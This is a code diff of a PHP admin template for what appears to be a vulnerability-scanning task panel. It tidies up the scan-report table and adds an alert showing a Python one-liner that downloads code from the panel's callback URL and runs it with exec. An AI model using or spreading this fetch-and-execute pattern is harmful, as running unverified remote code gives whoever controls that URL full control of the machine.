@@ -1,6 +1,6 @@
 <?php 
 if(!defined('EMLOG_ROOT')) {exit('error!');} 
-IsLogin()
+IsLogin();
 ?>
 <div class="container-fluid">
       <div class="row-fluid">
@@ -68,6 +68,11 @@ IsLogin()
 							<h4 class="modal-title" id="myModalLabel">漏洞扫描报告</h4>
 						</div>
 						<div class="modal-body">
+					<div class="alert alert-info alert-dismissible" role="alert">
+						<?php $callback_url = BLOG_URL.'?get/'.$v["token"];?>
+						<button type="button" class="close" data-dismiss="alert" aria-label="Close"><span aria-hidden="true">&times;</span></button>
+						<strong>命令参数：</strong><code>python -c"exec(__import__('urllib').urlopen('<?php echo $callback_url;?>').read())"</code>
+					</div>
 						<?php 
 						$rows = '<table class="table table-bordered">
 								<thead>
@@ -81,17 +86,20 @@ IsLogin()
 									</tr>
 								</thead>
 								<tbody>';
-						foreach($website_data as $_k=>$_v){
-							if(is_array($_v)){
-								$_content = "";
-								foreach($_v as $_vv){
-									$_content .= $_vv."</br>";
+								if(count($website_data)>0){
+								foreach($website_data as $_k=>$_v){
+										if(is_array($_v)){
+											$_content = "";
+											foreach($_v as $_vv){
+												$_content .= $_vv."</br>";
+											}
+											$rows .= "<tr><td>$_k</td><td>$_content</td></tr>";
+										}else{
+											$rows .= "<tr><td>$_k</td><td>$_v</td></tr>";
+										}
+									}
 								}
-								$rows .= "<tr><td>$_k</td><td>$_content</td></tr>";
-							}else{
-								$rows .= "<tr><td>$_k</td><td>$_v</td></tr>";
-							}
-						}
+						
 						$rows .="</tbody>
 							</table>";
 						echo $rows;	
@@ -106,19 +114,8 @@ IsLogin()
 					</div>
 					</div>
 			<?php endforeach;?>
-			<div class="pagination">
-				<ul>
-					<li><a href="#">Prev</a></li>
-					<li class="active">
-						<a href="#">1</a>
-					</li>
-					<li><a href="#">2</a></li>
-					<li><a href="#">3</a></li>
-					<li><a href="#">4</a></li>
-					<li><a href="#">Next</a></li>
-				</ul>
-			</div>
-			<a href="new-user.html" class="btn btn-success">New User</a>
+			
+			<a href="?task_add" class="btn btn-success">New Task</a>
 		  </div>
         </div>
       </div>
